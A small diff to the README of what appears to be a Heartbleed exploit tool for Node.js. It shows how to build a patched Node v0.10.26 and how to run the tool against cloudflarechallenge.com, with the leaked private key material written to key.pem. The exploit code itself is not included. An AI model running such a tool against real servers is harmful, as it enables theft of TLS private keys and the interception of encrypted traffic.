@@ -13,7 +13,7 @@ git clone git://github.com/joyent/node -b v0.10.26 node-hb
 cd node-hb
 git apply ../heartbleed/node-v0.10.26.patch
 ./configure --prefix=$HOME/.node/0.10.26-hb
-make -j24
+make -j24 install
 ls ./node
 ```
 
@@ -35,7 +35,7 @@ Options:
 
 Missing required arguments: host
 
-$ heartbleed -h cloudflarechallenge.com -c 1000 > key.pem
+$ heartbleed -h cloudflarechallenge.com -c 1000 >> key.pem
 ```
 
 #### LICENSE
